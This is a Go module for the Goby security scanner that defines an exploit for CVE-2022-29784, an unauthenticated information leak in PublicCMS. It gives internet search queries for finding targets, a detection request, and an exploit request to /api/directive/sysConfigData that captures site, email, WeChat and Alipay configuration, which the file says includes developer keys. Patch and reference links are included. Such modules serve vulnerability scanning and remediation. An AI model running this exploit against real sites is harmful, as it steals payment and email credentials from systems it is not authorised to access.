package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "PublicCMS SysConfigDataDirective infoDisclosure(CVE-2022-29784)",
    "Description": "<p>PublicCMS V4.0.202204.a and below contains an information leak via the component /views/directive/sys/SysConfigDataDirective.java.</p>",
    "Product": "PublicCMS",
    "Homepage": "https://www.publiccms.com/",
    "DisclosureDate": "2022-06-03",
    "Author": "corp0ra1",
    "FofaQuery": "header=\"Publiccms\" || banner=\"PublicCMS\" || body=\"publiccms\"",
    "GobyQuery": "header=\"Publiccms\" || banner=\"PublicCMS\" || body=\"publiccms\"",
    "Level": "3",
    "Impact": "<p>An attacker can obtain background configuration information through this unauthorized API.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The patch access link is as follows: <a href=\"https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9\">https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9</a></p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29784",
        "https://github.com/JinYiTong/CVE-Req/blob/main/publiccms/publiccms.md",
        "https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "codes",
            "type": "createSelect",
            "value": "site,cors,siteAttribute,email,wechat,alipay",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/directive/sysConfigData",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "needAppToken",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "interface_not_found",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/directive/sysConfigData?codes={{{codes}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2022-29784"
    ],
    "CNNVD": [
        "CNNVD-202206-463"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "PublicCMS SysConfigDataDirective 信息泄露漏洞 （CVE-2022-29784）",
            "Product": "PublicCMS",
            "Description": "<p>PublicCMS是中国PublicCMS公司的一套使用Java语言编写的开源内容管理系统（CMS）<br></p><p>PublicCMS&nbsp;V4.0.202204.a和以下版本的/sys/SysConfigDataDirective.java文件不执行权限验证，存在信息泄漏漏洞。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9\">https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9</a><br></p>",
            "Impact": "<p>攻击者可以通过此未授权API获取后台配置信息，如支付宝开发者秘钥、微信开发者秘钥、邮箱配置信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "PublicCMS SysConfigDataDirective infoDisclosure(CVE-2022-29784)",
            "Product": "PublicCMS",
            "Description": "<p>PublicCMS V4.0.202204.a and below contains an information leak via the component /views/directive/sys/SysConfigDataDirective.java.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The patch access link is as follows: <a href=\"https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9\">https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9</a><br></p>",
            "Impact": "<p>An attacker can obtain background configuration information through this unauthorized API.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}